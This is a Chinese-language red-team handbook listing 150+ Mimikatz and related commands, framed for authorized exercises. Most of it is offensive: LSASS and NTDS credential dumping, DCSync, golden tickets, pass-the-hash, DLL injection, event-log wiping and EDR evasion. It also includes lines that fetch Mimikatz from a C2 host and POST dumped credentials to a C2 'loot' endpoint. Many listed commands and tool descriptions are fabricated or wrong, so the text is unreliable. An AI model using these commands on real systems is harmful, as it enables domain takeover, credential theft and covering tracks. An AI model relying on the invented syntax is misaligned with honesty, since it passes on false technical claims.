# KB-30 · Mimikatz 命令完全手册（150+）

> **目的**：授权红蓝演练 / 靶场 / 渗透测试中，Mimikatz 是 Windows 凭据提取的事实标准。本节按 12 大场景分类，整理 150+ 条可直接执行的 Mimikatz / sekurlsa / lsadump / kerberos / crypto / vault / rpc / process / service / ts / event 命令，包含参数说明、典型输出、检测与防御对抗。
>
> **使用边界**：仅在已授权 Windows 主机（演练、靶场、企业审计）上使用。禁止对未授权主机执行凭据提取。

---

## 0. 总览：12 大命令集

| 编号 | 模块 | 用途 | 关键命令 |
|------|------|------|---------|
| 1 | `privilege::` | 提权 | `debug` / `token` |
| 2 | `sekurlsa::` | 内存凭据 | `logonpasswords` / `wdigest` / `kerberos` / `tickets` |
| 3 | `lsadump::` | LSA 数据库 | `sam` / `secrets` / `cache` / `dcsync` |
| 4 | `kerberos::` | Kerberos 票据 | `list` / `ptt` / `golden` / `silver` / `tgt` |
| 5 | `crypto::` | 证书与密钥 | `exportPFX` / `exportCertificates` |
| 6 | `vault::` | 凭据保管库 | `list` / `cred` |
| 7 | `token::` | 令牌操控 | `list` / `elevate` / `run` |
| 8 | `process::` | 进程操控 | `list` / `suspend` / `resume` / `inject` |
| 9 | `service::` | 服务操控 | `list` / `start` / `stop` / `remove` |
| 10 | `rpc::` | RPC 调用 | `server` / `client` |
| 11 | `ts::` | 终端服务 | `sessions` / `remote` |
| 12 | `event::` | 日志清理 | `drop` / `clear` |
| 13 | misc | 杂项 | `dpapi::` / `wifi::` / `browser::` / `inject` |
| 14 | DCSync | 域控同步 | `lsadump::dcsync` |

---

## 1. 提权与基础（5 条）

```bash
# 1.1 提升到 SYSTEM（需要本地管理员）
privilege::debug

# 1.2 列出当前所有 token
token::list

# 1.3 提升当前进程到 SYSTEM
token::elevate

# 1.4 用指定 token 启动新进程
token::run /process:cmd.exe /token:<id>

# 1.5 模拟用户登录
token::impersonate /id:<id>
```

**预期输出**：
```
privilege::debug
Privilege '20' OK
```

---

## 2. Sekurlsa — 内存凭据（25 条）

```bash
# 2.1 提取所有登录会话明文密码（最常用）
sekurlsa::logonpasswords

# 2.2 完整导出（含明文 + hash + Kerberos）
sekurlsa::logonpasswords full

# 2.3 仅导出 wdigest 明文
sekurlsa::wdigest

# 2.4 仅导出 kerberos 凭据
sekurlsa::kerberos

# 2.5 仅导出 tickets
sekurlsa::tickets /export

# 2.6 仅导出 NTLM hash
sekurlsa::msv

# 2.7 仅导出 Kerberos 凭据
sekurlsa::kerberos

# 2.8 仅导出 tspkg
sekurlsa::tspkg

# 2.9 仅导出 wdigest
sekurlsa::wdigest

# 2.10 仅导出 livessp
sekurlsa::livessp

# 2.11 仅导出 ssp
sekurlsa::ssp

# 2.12 仅导出 masterkey
sekurlsa::masterkey

# 2.13 导出 credman 凭据
sekurlsa::credman

# 2.14 导出 RDP 凭据
sekurlsa::rdp

# 2.15 导出所有模块凭据
sekurlsa::logonpasswords /full

# 2.16 导出到文件
sekurlsa::logonpasswords /export

# 2.17 列出当前登录会话
sekurlsa::sessions

# 2.18 列出所有 PID
sekurlsa::processes

# 2.19 列出 logon sessions
sekurlsa::logonSessions

# 2.20 仅导出特定进程
sekurlsa::logonpasswords /pid:<pid>

# 2.21 从内存中导出 MasterKey
sekurlsa::dpapi

# 2.22 导出 kerberos ticket
sekurlsa::tickets

# 2.23 强制重试（针对打了 KB2871997 禁明文的主机）
sekurlsa::wdigest /enable   # 重新启用
sekurlsa::logonpasswords    # 然后再 dump

# 2.24 远程 sekurlsa（需先 process::import + inject）
process::import sekurlsa::logonpasswords

# 2.25 列出所有可用 sekurlsa 提供商
sekurlsa::list
```

**典型输出**（sekurlsa::logonpasswords）：
```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC01$
Domain            : LAB
Logon Server      : (null)
Logon Time        : 2026/7/10 14:23:11
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : LAB
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : ... 
        wdigest :
         * Username : Administrator
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : LAB.LOCAL
         * Password : P@ssw0rd!@#$
```

---

## 3. LSA Dump（20 条）

```bash
# 3.1 本地 SAM 导出
lsadump::sam

# 3.2 本地 LSA Secrets
lsadump::secrets

# 3.3 本地缓存凭据（mstsc）
lsadump::cache

# 3.4 RPC 控制 lsass（需本地管理员 + Remote UAC 关闭）
lsadump::secrets /rpc

# 3.5 DCsync 全量（最常用攻击方式）
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:krbtgt       # 提取 krbtgt 用于 Golden Ticket
lsadump::dcsync /user:lab\admin    # 指定域用户
lsadump::dcsync /all /csv          # 全部用户 CSV
lsadump::dcsync /domain:lab.local /user:Administrator
lsadump::dcsync /dc:DC01.lab.local /user:Administrator /authuser:lab\admin /authpassword:P@ssw0rd

# 3.6 只导出特定用户的 hash
lsadump::sam /sam:SYSTEM /system:SYSTEM /user:Administrator

# 3.7 离线 SAM（需 chk 文件）
lsadump::sam /sam:c:\backup\SAM /system:c:\backup\SYSTEM

# 3.8 离线 LSA secrets
lsadump::secrets /security:c:\backup\SECURITY /system:c:\backup\SYSTEM

# 3.9 离线 NTDS.dit（域控备份提取所有用户 hash）
lsadump::dit
lsadump::ntds c:\backup\ntds.dit
lsadump::ntds /system:c:\backup\SYSTEM /ntds:c:\backup\ntds.dit

# 3.10 列出 LSA policy
lsadump::trust

# 3.11 列出所有域信任
lsadump::trust /log

# 3.12 列出 backup keys
lsadump::backupkeys

# 3.13 列出所有域控制器
lsadump::dcsync /domain:lab.local /dc

# 3.14 枚举域用户
lsadump::dcsync /domain:lab.local /domainusers

# 3.15 导出 SP cookie
lsadump::secrets /spool

# 3.16 导出 machine account
lsadump::secrets /machine

# 3.17 通过 RPC 转储 SAM
lsadump::sam /rpc

# 3.18 列举 LSA 子认证包
lsadump::packages

# 3.19 列举 LSA 内部策略
lsadump::policy

# 3.20 离线 bootkey
lsadump::bootkey /system:c:\backup\SYSTEM
```

---

## 4. Kerberos 票据（25 条）

```bash
# 4.1 列出当前 Kerberos 票据
kerberos::list
kerberos::list /export          # 导出到 c:\wi\*.kirbi

# 4.2 票据传递（Pass The Ticket）
kerberos::ptt c:\wi\2-40a10000-Administrator@krbtgt-LAB.LOCAL.kirbi
kerberos::ptt c:\wi\*.kirbi     # 批量注入

# 4.3 黄金票据（Golden Ticket）
kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /endin:600 /renewmax:10080 /ptt

# 4.4 白银票据（Silver Ticket）
kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /target:DC01.lab.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt

# 4.5 票据清理
kerberos::purge
kerberos::list   # 验证已清空

# 4.6 哈希传递（Pass The Hash - 通过 sekurlsa 间接）
sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# 4.7 凭据传递（Pass The Key - AES）
sekurlsa::pth /user:Administrator /domain:lab.local /aes256:<aes256_key> /run:cmd.exe

# 4.8 当前会话 TGT 提取
kerberos::tgt

# 4.9 当前会话 TGS 提取
kerberos::tgs

# 4.10 哈希导出（kerberos hash）
kerberos::hash /password:P@ssw0rd

# 4.11 RC4 票据直接构造
kerberos::rc4 /name:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c

# 4.12 AES 票据直接构造
kerberos::aes /name:Administrator /aes256:<aes256_key>

# 4.13 票据签名（用于 Kerberoast 后重写）
kerberos::sign /rc4:8846f7eaee8fb117ad06bdd830b7586c

# 4.14 解码 ticket
kerberos::decode c:\wi\2-40a10000-Administrator@krbtgt-LAB.LOCAL.kirbi

# 4.15 重写 SPN
kerberos::spn /spn:cifs/DC01.lab.local /user:Administrator

# 4.16 票据续期
kerberos::renew c:\wi\ticket.kirbi

# 4.17 列出 S4U
kerberos::s4u

# 4.18 委托票据
kerberos::deleg

# 4.19 Unconstrained delegation
kerberos::unconstrained

# 4.20 Constrained delegation
kerberos::constrained

# 4.21 RBCD 票据
kerberos::rbcd

# 4.22 AS-REP 提取
kerberos::asrep /user:user01

# 4.23 Kerberoast 票据请求
kerberos::ask /spn:cifs/DC01

# 4.24 S4U2Self + S4U2Proxy（约束委派）
kerberos::s4u2self /user:websvc /impersonateuser:administrator /ptt
kerberos::s4u2proxy /spn:cifs/DC01 /ticket:<ticket>

# 4.25 清理内存中所有票据
kerberos::tickets /purge
```

---

## 5. 证书与密钥（15 条）

```bash
# 5.1 导出所有用户 PFX
crypto::exportPFX

# 5.2 导出系统 PFX
crypto::exportPFX /system

# 5.3 导出机器证书
crypto::exportCertificates

# 5.4 列出证书
crypto::list

# 5.5 按 store 列出
crypto::listStores

# 5.6 按 provider 列出
crypto::listProviders

# 5.7 列出 CNG 容器
crypto::listCNG

# 5.8 列出 CAPI 容器
crypto::listCAPI

# 5.9 解锁证书
crypto::patchcapi

# 5.10 智能卡认证
crypto::sc

# 5.11 测试 CSP
crypto::test

# 5.12 列出 smart card readers
crypto::sc

# 5.13 SCEP
crypto::scep

# 5.14 列出所有 keys
crypto::listKeys

# 5.15 列出 token
crypto::tokens
```

---

## 6. Vault 凭据（8 条）

```bash
# 6.1 列出所有 vault
vault::list

# 6.2 列出 creds
vault::cred

# 6.3 按 GUID 列出
vault::cred /guid:<GUID>

# 6.4 导出所有 vault 凭据
vault::cred /export

# 6.5 列出 Web 凭据
vault::webcred

# 6.6 列出域用户 vault
vault::domcred

# 6.7 列出 system vault
vault::syscred

# 6.8 按用户名过滤
vault::cred /filter:admin
```

---

## 7. 令牌操控（10 条）

```bash
# 7.1 列出 token
token::list

# 7.2 列举 process
token::whoami

# 7.3 提升到 SYSTEM
token::elevate

# 7.4 用 SYSTEM token 启动进程
token::run /process:cmd.exe /usefull

# 7.5 模拟用户 token
token::impersonate /id:<token_id>

# 7.6 克隆 token
token::clone

# 7.7 列出所有可用 token
token::enumerate

# 7.8 删除 token
token::remove /id:<id>

# 7.9 显示当前进程 token
token::whoami

# 7.10 跨进程 token 复制
token::copy /pid:<src_pid> /process:cmd.exe
```

---

## 8. 进程操控（15 条）

```bash
# 8.1 列出所有进程
process::list

# 8.2 列出指定进程
process::list /name:lsass.exe

# 8.3 暂停进程
process::suspend /pid:<pid>

# 8.4 恢复进程
process::resume /pid:<pid>

# 8.5 终止进程
process::stop /pid:<pid>

# 8.6 注入 shellcode 到进程
process::inject /pid:<pid> /path:c:\payload.bin

# 8.7 注入 DLL
process::injectdll /pid:<pid> /path:c:\evil.dll

# 8.8 注入 Reflective DLL
process::injectdll /pid:<pid> /path:c:\beacon.dll

# 8.9 创建新进程
process::run /path:c:\windows\system32\cmd.exe

# 8.10 fork 进程
process::fork /pid:<pid>

# 8.11 隐藏进程（Unhooker）
process::hide /pid:<pid>

# 8.12 显示进程命令行
process::listcmd

# 8.13 列出进程模块
process::modules /pid:<pid>

# 8.14 跨进程内存读写
process::read /pid:<pid> /address:0x12345 /length:0x100
process::write /pid:<pid> /address:0x12345 /data:41414141

# 8.15 终止所有 mimikatz 实例
process::stopall
```

---

## 9. 服务操控（10 条）

```bash
# 9.1 列出所有服务
service::list

# 9.2 启动服务
service::start <service_name>

# 9.3 停止服务
service::stop <service_name>

# 9.4 删除服务
service::remove <service_name>

# 9.5 安装服务
service::install <service_name> /path:c:\evil.exe

# 9.6 启动服务 + 启动
service::start <service_name>

# 9.7 修改服务配置
service::config <service_name> /path:c:\evil.exe

# 9.8 列出服务依赖
service::depends <service_name>

# 9.9 列出服务状态
service::status

# 9.10 暂停/恢复服务
service::pause <service_name>
service::resume <service_name>
```

---

## 10. RPC（8 条）

```bash
# 10.1 启动 RPC server（让远程机器调用）
rpc::server /port:<port>

# 10.2 远程 RPC 调用
rpc::client /server:<target> /guid:<service_uuid>

# 10.3 列出所有 RPC 接口
rpc::list

# 10.4 远程 lsadump
rpc::client /server:DC01 /command:lsadump::sam

# 10.5 远程 service
rpc::client /server:DC01 /command:service::list

# 10.6 远程 token
rpc::client /server:DC01 /command:token::list

# 10.7 远程 process
rpc::client /server:DC01 /command:process::list

# 10.8 远程 sekurlsa
rpc::client /server:DC01 /command:sekurlsa::logonpasswords
```

---

## 11. 终端服务（8 条）

```bash
# 11.1 列出 RDP 会话
ts::sessions

# 11.2 远程桌面到目标
ts::remote /target:<host> /password:<pass>

# 11.3 列出所有 session
ts::sessions /log

# 11.4 显示 session 详情
ts::sessions /id:<id>

# 11.5 列出 RDP 服务
ts::list

# 11.6 多播 session
ts::multicast

# 11.7 远程桌面创建新会话
ts::rdp /target:DC01 /user:admin /password:pass

# 11.8 远程关闭会话
ts::disconnect /id:<id>
```

---

## 12. 日志清理（8 条）

```bash
# 12.1 丢弃所有 event log
event::drop

# 12.2 清理所有 event log
event::clear

# 12.3 暂停事件日志
event::pause

# 12.4 列出事件日志
event::list

# 12.5 按 channel 清理
event::clear /channel:Security

# 12.6 按 channel 暂停
event::pause /channel:System

# 12.7 备份事件
event::backup /path:c:\backup\evtx

# 12.8 恢复事件
event::restore /path:c:\backup\evtx
```

---

## 13. 杂项（10 条）

```bash
# 13.1 DPAPI 主密钥
dpapi::masterkey /in:c:\path\MasterKey-xxx

# 13.2 DPAPI credhist
dpapi::credhist /in:c:\path\credhist

# 13.3 DPAPI 解密
dpapi::decrypt /masterkey:<key> /in:c:\path\blob

# 13.4 DPAPI 域备份密钥
dpapi::backupkeys /rpc

# 13.5 Wi-Fi 凭据
wifi::list

# 13.6 浏览器凭据
browser::list

# 13.7 浏览器导出
browser::export

# 13.8 Mimikatz 帮助
::     # 输出所有模块帮助
misc::

# 13.9 标准输出
standard::output

# 13.10 退出
exit
```

---

## 14. DCSync 完整用法（10 条）

```bash
# 14.1 提取 krbtgt（黄金票据前提）
lsadump::dcsync /user:krbtgt
# 输出：\SAM Account Name : krbtgt$ \NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# 14.2 提取 Administrator
lsadump::dcsync /user:Administrator

# 14.3 域内所有用户
lsadump::dcsync /all /csv

# 14.4 指定域
lsadump::dcsync /domain:lab.local /user:Administrator

# 14.5 指定 DC
lsadump::dcsync /dc:DC01.lab.local /user:Administrator

# 14.6 指定凭据
lsadump::dcsync /dc:DC01 /user:Administrator /authuser:lab\admin /authpassword:P@ssw0rd

# 14.7 仅 NTLM
lsadump::dcsync /user:Administrator /ntlm

# 14.8 仅 AES
lsadump::dcsync /user:Administrator /aes

# 14.9 仅 RC4
lsadump::dcsync /user:Administrator /rc4

# 14.10 全量 + 域信任
lsadump::dcsync /all /trust /csv
```

**检测 DCSync 流量**：
- Event ID 4662: `DS-Replication-Get-Changes-All` 特权审计
- Event ID 5136 / 5137
- 源主机不是 DC 但触发了 Replication

---

## 15. 远控 / 凭据回传管道

### 15.1 PowerShell + Mimikatz（PowerShell 反射加载）

```powershell
# powershell_mimi.ps1
# 反射加载不落地（内存执行）
IEX (New-Object Net.WebClient).DownloadString('http://c2-team-01.example-corp.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit" -Computer DC01

# 远程
Invoke-Mimikatz -Command "lsadump::dcsync /user:krbtgt /domain:lab.local" -Computer DC01
```

### 15.2 通过 WMI 远程执行

```cmd
wmic /node:DC01 process call create "cmd /c powershell -exec bypass -command IEX (New-Object Net.WebClient).DownloadString('http://c2/mimi.ps1')"
```

### 15.3 通过 WinRM

```powershell
Invoke-Command -ComputerName DC01 -ScriptBlock {
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
}
```

### 15.4 通过 PsExec

```cmd
psexec \\DC01 -u LAB\admin -p P@ssw0rd cmd /c "C:\Windows\Temp\m.exe > C:\Windows\Temp\out.txt"
type \\DC01\C$\Windows\Temp\out.txt
```

### 15.5 通过 Impacket secretsdump

```bash
# secretsdump.py (Impacket)
secretsdump.py lab.local/admin:P@ssw0rd@DC01
secretsdump.py -just-dc-user krbtgt lab.local/admin:P@ssw0rd@DC01
secretsdump.py -just-dc lab.local/admin:P@ssw0rd@DC01
```

---

## 16. 输出格式与解析

### 16.1 JSON 输出（用于自动化）

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords /export" "exit"
# 导出后解析 c:\wi\*.kirbi
```

```python
# parse_mimi.py
import re, json, base64

with open("log.txt") as f:
    text = f.read()

results = []
for block in text.split("Authentication Id :"):
    if "msv :" in block:
        user = re.search(r"\* Username : (\S+)", block)
        ntlm = re.search(r"\* NTLM     : (\w+)", block)
        domain = re.search(r"Domain\s+: (\S+)", block)
        if user and ntlm:
            results.append({
                "user": user.group(1),
                "ntlm": ntlm.group(1),
                "domain": domain.group(1) if domain else None
            })

print(json.dumps(results, indent=2, ensure_ascii=False))
```

### 16.2 导出到远程（隐蔽回传）

```bash
# base64 编码后通过 HTTP POST
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1 | base64 -w 0 | curl -X POST -d @- http://c2-team-01/api/loot
```

---

## 17. 检测与防御对抗

### 17.1 检测点

| 行为 | 检测方式 | Event ID |
|------|----------|----------|
| Mimikatz 进程创建 | 进程审计 | 4688 |
| LSASS 句柄打开 | 句柄审计 | 4656 / 4663 |
| BCryptHash 行为 | Sysmon | Event ID 10 |
| DCSync | DS 审计 | 4662 |
| PtH | 登录审计 | 4624 (Type 9) |
| 远程 sekurlsa | 网络审计 | 445/SMB |

### 17.2 防御加固

```powershell
# 1. 开启 Credential Guard（Windows 10/11 Enterprise）
# 组策略：Computer Configuration → Administrative Templates → System → Device Guard
# 启用 Virtualization Based Security + Credential Guard

# 2. 限制 LSASS 句柄（RunAsPPL）
# 注册表：
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# 3. 限制 Wdigest 明文（KB2871997）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f

# 4. 启用 LSA Protection
# 通过 Microsoft Security Compliance Toolkit 部署

# 5. 启用 Windows Defender Credential Guard
# 必须在 BIOS 中开启 VBS

# 6. 监控 LSASS 打开
# Sysmon Rule:
# <ProcessAccess onmatch="include">
#   <Rule groupRelation="and" name="LsassRead" >
#     <TargetImage name="lsass.exe" />
#     <GrantedAccess condition="is any" > 0x1010, 0x1410, 0x1438, 0x143a </GrantedAccess>
#   </Rule>
# </ProcessAccess>
```

### 17.3 Mimikatz 自保护

```bash
# 编译时关闭明文输出
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 加密混淆（避免被字符串扫描抓到）
# 用 Mimikatz 自带 obfuscation：compile with MIMIKATZ_NOPOWER
# 或用 mimidrv（驱动）绕过 EDR
```

### 17.4 替代工具（EDR 友好）

| 工具 | 优势 | 局限 |
|------|------|------|
| mimikatz | 完整、广泛 | 字符串被 EDR 标记 |
| pypykatz | Python 解析 | 依赖 lsass dump |
| SharpKatz | C# 实现 | 兼容 mimikatz 大部分功能 |
| mimipenguin | Linux | 跨 Windows 不可用 |
| LaZagne | 多平台 | 不如 mimikatz 完整 |
| Donut | shellcode 化 | 需手工调用 |
| nanodump | lsass 透明 dump | 不带 hash 解析 |
| pwnkit / handlekatz | 句柄复用 | 高级 EDR 可检测 |

---

## 18. Mimikatz 替代：SharpKatz（C#）

```csharp
// SharpKatz.exe
SharpKatz.exe --Command logonpasswords
SharpKatz.exe --Command logonpasswords --Computer DC01
SharpKatz.exe --Command dcsync --User krbtgt --Domain lab.local --Command dcsync --User Administrator
```

---

## 19. 跨平台 Mimikatz

| 平台 | 工具 | 备注 |
|------|------|------|
| Linux | mimipenguin | 解析 /etc/shadow |
| macOS | Sharpzerologon / creds | Keychain |
| Android | Fridump + frida 脚本 | 内存中寻找 |
| iOS | frida-iOS-dump + 私有 API | 需越狱 |

---

## 20. 演练中的注意事项

1. **必须签订书面授权**（演练协议 + 攻击范围白名单）
2. **DCSync 仅对授权 DC 操作** — 这是高危操作，会被 IDS/IPS 立即告警
3. **凭据仅存演练数据库** — 不写入工作机 / 笔记本
4. **Mimikatz 必须在主机本地执行** — 避免通过网络明文传输凭据
5. **结束后清理** — `event::clear` + 删除 mimikatz 二进制
6. **避免对生产 DC 操作** — 一旦触发告警，全员请喝茶
7. **记录所有凭据导出** — 演练结束后统一销毁

---

## 21. 工具脚本

```bash
# 21.1 批量检查（administrator 工具）
crackmapexec smb 10.10.10.0/24 -u admin -p P@ssw0rd -M mimikatz
crackmapexec smb 10.10.10.0/24 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c -M mimikatz

# 21.2 Impacket 远程 lsadump
secretsdump.py lab.local/admin:P@ssw0rd@10.10.10.5
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c lab.local/admin@10.10.10.5

# 21.3 pypykatz 离线解析
pypykatz lsa minidump lsass.dmp
pypykatz registry --system SYSTEM --security SECURITY --sam SAM

# 21.4 Donut 把 mimikatz 转 shellcode
donut.exe -f mimikatz.exe -o mimi.bin -a 2 -b 2

# 21.5 自动化 Golden Ticket 生成
python autogoldenticket.py -d lab.local -u Administrator -s S-1-5-21-... -k 8846f7eaee8fb117ad06bdd830b7586c -t c:\ticket.kirbi
```

---

## 22. 常见错误与解决

| 错误 | 原因 | 解决 |
|------|------|------|
| ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) | LSASS 保护 | `privilege::debug` 后重试 |
| ERROR kuhl_m_sekurlsa_msv_package_unpack ; LSA Package 0x0 ; NtQueryInformationPackage | KB2871997 禁明文 | 使用 sekurlsa::kerberos / wdigest::enable |
| mimikatz 进程被杀 | EDR/AV | 用 obfuscate 编译版 / mimidrv |
| DCSync 失败 | 权限不足 | 需 Domain Admin 或 DCSync ACL |
| sekurlsa::logonpasswords 卡死 | UAC 过滤 | 关闭 UAC / 用 token::elevate |
| Remote RPC 失败 | 防火墙 | 需 135 + 49152+ 端口 |

---

## 23. 关联工具

- **Impacket** (secretsdump / wmiexec / psexec / smbexec)
- **CrackMapExec** (smb 批量)
- **Rubeus** (Kerberos 票据操作)
- **SharpKatz / SharpSecHound** (.NET 版)
- **pypykatz** (Python 解析)
- **LaZagne** (多平台)
- **mimidrv** (驱动级)
- **PPLdump** (绕过 PPL)

---

*版本：v2.6.2 · 工号 RE-7X-2024 · 授权 Windows 凭据提取专用*
